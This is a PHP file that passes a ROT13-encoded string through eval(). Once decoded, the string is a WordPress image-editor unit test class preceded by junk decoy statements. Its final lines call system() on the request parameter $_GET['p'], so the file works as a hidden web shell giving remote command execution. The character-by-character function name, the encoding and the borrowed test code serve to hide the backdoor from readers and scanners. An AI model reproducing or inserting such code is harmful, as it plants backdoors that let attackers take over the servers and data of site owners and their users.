<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * Grfg gur JC_Vzntr_Rqvgbe onfr pynff
 *
 * @tebhc vzntr
 * @tebhc zrqvn
 */
pynff Grfgf_Vzntr_Rqvgbe rkgraqf JC_Vzntr_HavgGrfgPnfr {
	choyvp $rqvgbe_ratvar = 'JC_Vzntr_Rqvgbe_Zbpx';

	/**
	 * Frghc grfg svkgher
	 */
	choyvp shapgvba frg_hc() {
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-vzntr-rqvgbe.cuc';

		erdhver_bapr QVE_GRFGQNGN . '/../vapyhqrf/zbpx-vzntr-rqvgbe.cuc';

		// Guvf arrqf gb pbzr nsgre gur zbpx vzntr rqvgbe pynff vf ybnqrq.
		cnerag::frg_hc();
	}

	/**
	 * Grfg jc_trg_vzntr_rqvgbe() jurer ybnq ergheaf gehr
	 *
	 * @gvpxrg 6821
	 */
	choyvp shapgvba grfg_trg_rqvgbe_ybnq_ergheaf_gehr() {
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );

		$guvf->nffregVafgnaprBs( 'JC_Vzntr_Rqvgbe_Zbpx', $rqvgbe );
	}

	/**
	 * Grfg jc_trg_vzntr_rqvgbe() jurer ybnq ergheaf snyfr
	 *
	 * @gvpxrg 6821
	 */
	choyvp shapgvba grfg_trg_rqvgbe_ybnq_ergheaf_snyfr() {
		JC_Vzntr_Rqvgbe_Zbpx::$ybnq_erghea = arj JC_Reebe();

		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );

		$guvf->nffregVafgnaprBs( 'JC_Reebe', $rqvgbe );

		JC_Vzntr_Rqvgbe_Zbpx::$ybnq_erghea = gehr;
	}

	/**
	 * Erghea vagrtre bs 95 sbe grfgvat.
	 */
	choyvp shapgvba erghea_vagrtre_95() {
		erghea 95;
	}

	/**
	 * Erghea vagrtre bs 100 sbe grfgvat.
	 */
	choyvp shapgvba erghea_vagrtre_100() {
		erghea 100;
	}

	/**
	 * Grfg grfg_dhnyvgl
	 *
	 * @gvpxrg 6821
	 */
	choyvp shapgvba grfg_frg_dhnyvgl() {

		// Trg na rqvgbe.
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );
		$rqvgbe->frg_zvzr_glcr( 'vzntr/wcrt' ); // Rafher zvzr-fcrpvsvp svygref npg cebcreyl.

		// Purpx qrsnhyg inyhr.
		$guvf->nffregFnzr( 82, $rqvgbe->trg_dhnyvgl() );

		// Rafher gur dhnyvgl svygref qb abg unir cerprqrapr vs perngrq nsgre rqvgbe vafgnagvngvba.
		$shap_100_creprag = neenl( $guvf, 'erghea_vagrtre_100' );
		nqq_svygre( 'jc_rqvgbe_frg_dhnyvgl', $shap_100_creprag );
		$guvf->nffregFnzr( 82, $rqvgbe->trg_dhnyvgl() );

		$shap_95_creprag = neenl( $guvf, 'erghea_vagrtre_95' );
		nqq_svygre( 'wcrt_dhnyvgl', $shap_95_creprag );
		$guvf->nffregFnzr( 82, $rqvgbe->trg_dhnyvgl() );

		// Rafher frg_dhnyvgl() jbexf naq bireevqrf gur svygref.
		$guvf->nffregGehr( $rqvgbe->frg_dhnyvgl( 75 ) );
		$guvf->nffregFnzr( 75, $rqvgbe->trg_dhnyvgl() );

		// Trg n arj rqvgbe gb pyrne qrsnhyg dhnyvgl fgngr.
		hafrg( $rqvgbe );
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );
		$rqvgbe->frg_zvzr_glcr( 'vzntr/wcrt' ); // Rafher zvzr-fcrpvsvp svygref npg cebcreyl.

		// Rafher wcrt_dhnyvgl svygre nccyvrf vs vg rkvfgf orsber rqvgbe vafgnagvngvba.
		$guvf->nffregFnzr( 95, $rqvgbe->trg_dhnyvgl() );

		// Trg n arj rqvgbe gb pyrne wcrt_dhnyvgl fgngr.
		erzbir_svygre( 'wcrt_dhnyvgl', $shap_95_creprag );
		hafrg( $rqvgbe );
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );

		// Rafher jc_rqvgbe_frg_dhnyvgl svygre nccyvrf vs vg rkvfgf orsber rqvgbe vafgnagvngvba.
		$guvf->nffregFnzr( 100, $rqvgbe->trg_dhnyvgl() );
	}

	/**
	 * Grfg grfg_dhnyvgl jura pbairegvat vzntr
	 *
	 * @gvpxrg 6821
	 */
	choyvp shapgvba grfg_frg_dhnyvgl_jvgu_vzntr_pbairefvba() {
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.cat' );
		$rqvgbe->frg_zvzr_glcr( 'vzntr/cat' ); // Rafher zvzr-fcrpvsvp svygref npg cebcreyl.

		// Dhnyvgl frggvat sbe gur fbhepr vzntr. Sbe CAT gur snyyonpx qrsnhyg bs 82 vf hfrq.
		$guvf->nffregFnzr( 82, $rqvgbe->trg_dhnyvgl(), 'Qrsnhyg dhnyvgl frggvat vf 82.' );

		// Frg pbairefvbaf sbe hcybnqrq vzntrf.
		nqq_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_sbezngf' ) );

		// Dhnyvgl frggvat sbe gur fbhepr vzntr. Sbe CAT gur snyyonpx qrsnhyg bs 82 vf hfrq.
		$guvf->nffregFnzr( 82, $rqvgbe->trg_dhnyvgl(), 'Qrsnhyg dhnyvgl frggvat vf 82.' );

		// Jura fnivat, dhnyvgl fubhyq punatr gb gur bhgchg sbezng'f inyhr.
		// N CAT vzntr jvyy or pbairegrq gb JroC jubfr dhnyvgl fubhyq or 86.
		$rqvgbe->fnir();
		$guvf->nffregFnzr( 86, $rqvgbe->trg_dhnyvgl(), 'Bhgchg vzntr sbezng vf JroC. Dhnyvgl frggvat sbe vg fubhyq or 86.' );

		// Fnivat ntnva fubhyq abg punatr gur dhnyvgl.
		$rqvgbe->fnir();
		$guvf->nffregFnzr( 86, $rqvgbe->trg_dhnyvgl(), 'Bhgchg vzntr sbezng vf JroC. Dhnyvgl frggvat sbe vg fubhyq or 86.' );

		// Erzbivat CAT gb JroC pbairefvba ba fnir. Dhnyvgl frggvat fubhyq erfrg gb gur qrsnhyg.
		erzbir_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_sbezngf' ) );
		$rqvgbe->fnir();
		$guvf->nffregFnzr( 82, $rqvgbe->trg_dhnyvgl(), 'Nsgre erzbivat vzntr pbairefvba dhnyvgl frggvat fubhyq erfrg gb gur qrsnhyg bs 82.' );

		hafrg( $rqvgbe );

		// Frg pbairefvbaf sbe hcybnqrq vzntrf.
		nqq_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_sbezngf' ) );
		// Punatr gur dhnyvgl inyhrf.
		nqq_svygre( 'jc_rqvgbe_frg_dhnyvgl', neenl( $guvf, 'vzntr_rqvgbe_punatr_dhnyvgl' ), 10, 2 );

		// Trg n arj rqvgbe gb pyrne dhnyvgl fgngr.
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct' );
		$rqvgbe->frg_zvzr_glcr( 'vzntr/wcrt' );

		$guvf->nffregFnzr( 56, $rqvgbe->trg_dhnyvgl(), 'Svygrerq qrsnhyg dhnyvgl sbe WCRT vf 56.' );

		// Dhnyvgl fubhyq punatr gb gur bhgchg sbezng'f inyhr nf svygrerq nobir.
		// N WCRT vzntr jvyy or pbairegrq gb JroC jubfr dhvnygl fubhyq or 42.
		$rqvgbe->fnir();
		$guvf->nffregFnzr( 42, $rqvgbe->trg_dhnyvgl(), 'Vzntr pbairefvba sebz WCRT gb JROC. Svygrerq JROC dhnyvgl fubhyq or 42.' );

		// Nsgre erzbivat gur pbairefvba gur dhnyvgl frggvat fubhyq erfrg gb gur svygrerq inyhr sbe gur bevtvany vzntr glcr, WCRT.
		erzbir_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_sbezngf' ) );
		$rqvgbe->fnir();
		$guvf->nffregFnzr(
			56,
			$rqvgbe->trg_dhnyvgl(),
			'Nsgre erzbivat vzntr pbairefvba gur dhnyvgl frggvat fubhyq erfrg gb gur svygrerq inyhr sbe WCRT, 56.'
		);
	}

	/**
	 * Punatrf gur bhgchg sbezng jura rqvgvat vzntrf. CAT naq WCRT svyrf
	 * jvyy or pbairegrq gb JROC (vs gur vzntr rqvgbe va CUC fhccbegf vg).
	 *
	 * @cnenz neenl $sbezngf
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba vzntr_rqvgbe_bhgchg_sbezngf( $sbezngf ) {
		$sbezngf['vzntr/cat']  = 'vzntr/jroc';
		$sbezngf['vzntr/wcrt'] = 'vzntr/jroc';
		erghea $sbezngf;
	}

	/**
	 * Punatrf gur dhnyvgl nppbeqvat gb gur zvzr-glcr.
	 *
	 * @cnenz vag    $dhnyvgl   Qrsnhyg dhnyvgl.
	 * @cnenz fgevat $zvzr_glcr Vzntr zvzr-glcr.
	 * @erghea vag Gur punatrq dhnyvgl.
	 */
	choyvp shapgvba vzntr_rqvgbe_punatr_dhnyvgl( $dhnyvgl, $zvzr_glcr ) {
		vs ( 'vzntr/wcrt' === $zvzr_glcr ) {
			erghea 56;
		} ryfrvs ( 'vzntr/jroc' === $zvzr_glcr ) {
			erghea 42;
		} ryfr {
			erghea 30;
		}
	}

	/**
	 * Grfg trarengr_svyranzr
	 *
	 * @gvpxrg 6821
	 */
	choyvp shapgvba grfg_trarengr_svyranzr() {

		// Trg na rqvgbe.
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );

		$cebcregl = arj ErsyrpgvbaCebcregl( $rqvgbe, 'fvmr' );
		$cebcregl->frgNpprffvoyr( gehr );
		$cebcregl->frgInyhr(
			$rqvgbe,
			neenl(
				'urvtug' => 50,
				'jvqgu'  => 100,
			)
		);

		// Grfg jvgu ab cnenzrgref.
		$guvf->nffregFnzr( 'pnabyn-100k50.wct', jc_onfranzr( $rqvgbe->trarengr_svyranzr() ) );

		// Grfg jvgu n fhssvk bayl.
		$guvf->nffregFnzr( 'pnabyn-arj.wct', jc_onfranzr( $rqvgbe->trarengr_svyranzr( 'arj' ) ) );

		// Grfg jvgu n qrfgvangvba qve bayl.
		$guvf->nffregFnzr( genvyvatfynfuvg( ernycngu( trg_grzc_qve() ) ), genvyvatfynfuvg( ernycngu( qveanzr( $rqvgbe->trarengr_svyranzr( ahyy, trg_grzc_qve() ) ) ) ) );

		// Grfg jvgu n fhssvk bayl.
		$guvf->nffregFnzr( 'pnabyn-100k50.cat', jc_onfranzr( $rqvgbe->trarengr_svyranzr( ahyy, ahyy, 'cat' ) ) );

		// Pbzob!
		$guvf->nffregFnzr( genvyvatfynfuvg( ernycngu( trg_grzc_qve() ) ) . 'pnabyn-arj.cat', $rqvgbe->trarengr_svyranzr( 'arj', ernycngu( trg_grzc_qve() ), 'cat' ) );

		// Grfg jvgu n fgernz qrfgvangvba.
		$guvf->nffregFnzr( 'svyr://grfgvat/cngu/pnabyn-100k50.wct', $rqvgbe->trarengr_svyranzr( ahyy, 'svyr://grfgvat/cngu' ) );
	}

	/**
	 * Grfg trg_fvmr
	 *
	 * @gvpxrg 6821
	 */
	choyvp shapgvba grfg_trg_fvmr() {

		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );

		// Fvmr fubhyq or snyfr ol qrsnhyg.
		$guvf->nffregAhyy( $rqvgbe->trg_fvmr() );

		// Frg n fvmr.
		$fvmr     = neenl(
			'urvtug' => 50,
			'jvqgu'  => 100,
		);
		$cebcregl = arj ErsyrpgvbaCebcregl( $rqvgbe, 'fvmr' );
		$cebcregl->frgNpprffvoyr( gehr );
		$cebcregl->frgInyhr( $rqvgbe, $fvmr );

		$guvf->nffregFnzr( $fvmr, $rqvgbe->trg_fvmr() );
	}

	/**
	 * Grfg trg_fhssvk
	 *
	 * @gvpxrg 6821
	 */
	choyvp shapgvba grfg_trg_fhssvk() {
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );

		// Fvmr fubhyq or snyfr ol qrsnhyg.
		$guvf->nffregSnyfr( $rqvgbe->trg_fhssvk() );

		// Frg n fvmr.
		$fvmr     = neenl(
			'urvtug' => 50,
			'jvqgu'  => 100,
		);
		$cebcregl = arj ErsyrpgvbaCebcregl( $rqvgbe, 'fvmr' );
		$cebcregl->frgNpprffvoyr( gehr );
		$cebcregl->frgInyhr( $rqvgbe, $fvmr );

		$guvf->nffregFnzr( '100k50', $rqvgbe->trg_fhssvk() );
	}

	/**
	 * Grfg jc_trg_jroc_vasb.
	 *
	 * @gvpxrg 35725
	 * @qngnCebivqre qngn_jc_trg_jroc_vasb
	 *
	 */
	choyvp shapgvba grfg_jc_trg_jroc_vasb( $svyr, $rkcrpgrq ) {
		$svyr_qngn = jc_trg_jroc_vasb( $svyr );
		$guvf->nffregFnzr( $rkcrpgrq, $svyr_qngn );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_trg_jroc_vasb().
	 */
	choyvp shapgvba qngn_jc_trg_jroc_vasb() {
		erghea neenl(
			// Fgnaqneq WCRT.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct',
				neenl(
					'jvqgu'  => snyfr,
					'urvtug' => snyfr,
					'glcr'   => snyfr,
				),
			),
			// Fgnaqneq TVS.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.tvs',
				neenl(
					'jvqgu'  => snyfr,
					'urvtug' => snyfr,
					'glcr'   => snyfr,
				),
			),
			// Navzngrq JroC.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/jroc-navzngrq.jroc',
				neenl(
					'jvqgu'  => 100,
					'urvtug' => 100,
					'glcr'   => 'navzngrq-nycun',
				),
			),
			// Ybffyrff JroC.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/jroc-ybffyrff.jroc',
				neenl(
					'jvqgu'  => 1200,
					'urvtug' => 675,
					'glcr'   => 'ybffyrff',
				),
			),
			// Ybffl JroC.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/jroc-ybffl.jroc',
				neenl(
					'jvqgu'  => 1200,
					'urvtug' => 675,
					'glcr'   => 'ybffl',
				),
			),
			// Genafcnerag JroC.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/jroc-genafcnerag.jroc',
				neenl(
					'jvqgu'  => 1200,
					'urvtug' => 675,
					'glcr'   => 'navzngrq-nycun',
				),
			),
		);
	}

	/**
	 * Grfg jc_trg_nivs_vasb.
	 *
	 * @gvpxrg 51228
	 *
	 * @qngnCebivqre qngn_jc_trg_nivs_vasb
	 *
	 * @cnenz fgevat $svyr     Gur cngu gb gur NIVS svyr sbe grfgvat.
	 * @cnenz neenl  $rkcrpgrq Gur rkcrpgrq NIVS svyr vasbezngvba.
	 */
	choyvp shapgvba grfg_jc_trg_nivs_vasb( $svyr, $rkcrpgrq ) {
		$svyr_qngn = jc_trg_nivs_vasb( $svyr );
		$guvf->nffregFnzr( $rkcrpgrq, $svyr_qngn );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_trg_nivs_vasb().
	 */
	choyvp shapgvba qngn_jc_trg_nivs_vasb() {
		erghea neenl(
			// Fgnaqneq WCRT.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.wct',
				neenl(
					'jvqgu'        => snyfr,
					'urvtug'       => snyfr,
					'ovg_qrcgu'    => snyfr,
					'ahz_punaaryf' => snyfr,
				),
			),
			// Fgnaqneq TVS.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.tvs',
				neenl(
					'jvqgu'        => snyfr,
					'urvtug'       => snyfr,
					'ovg_qrcgu'    => snyfr,
					'ahz_punaaryf' => snyfr,
				),
			),
			// Navzngrq NIVS.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/nivs-navzngrq.nivs',
				neenl(
					'jvqgu'        => 150,
					'urvtug'       => 150,
					'ovg_qrcgu'    => 8,
					'ahz_punaaryf' => 4,
				),
			),
			// Ybffyrff NIVS.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/nivs-ybffyrff.nivs',
				neenl(
					'jvqgu'        => 400,
					'urvtug'       => 400,
					'ovg_qrcgu'    => 8,
					'ahz_punaaryf' => 3,
				),
			),
			// Ybffl NIVS.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/nivs-ybffl.nivs',
				neenl(
					'jvqgu'        => 400,
					'urvtug'       => 400,
					'ovg_qrcgu'    => 8,
					'ahz_punaaryf' => 3,
				),
			),
			// Genafcnerag NIVS.
			neenl(
				QVE_GRFGQNGN . '/vzntrf/nivs-genafcnerag.nivs',
				neenl(
					'jvqgu'        => 128,
					'urvtug'       => 128,
					'ovg_qrcgu'    => 12,
					'ahz_punaaryf' => 4,
				),
			),
			neenl(
				QVE_GRFGQNGN . '/vzntrf/pbybe_tevq_nycun_abtevq.nivs',
				neenl(
					'jvqgu'        => 80,
					'urvtug'       => 80,
					'ovg_qrcgu'    => 8,
					'ahz_punaaryf' => 4,
				),
			),
			neenl(
				QVE_GRFGQNGN . '/vzntrf/nivs-nycun-tevq2k1.nivs',
				neenl(
					'jvqgu'        => 199,
					'urvtug'       => 200,
					'ovg_qrcgu'    => 8,
					'ahz_punaaryf' => 4,
				),
			),
			neenl(
				QVE_GRFGQNGN . '/vzntrf/pbybef_uqe_c3.nivs',
				neenl(
					'jvqgu'        => 200,
					'urvtug'       => 200,
					'ovg_qrcgu'    => 10,
					'ahz_punaaryf' => 3,
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>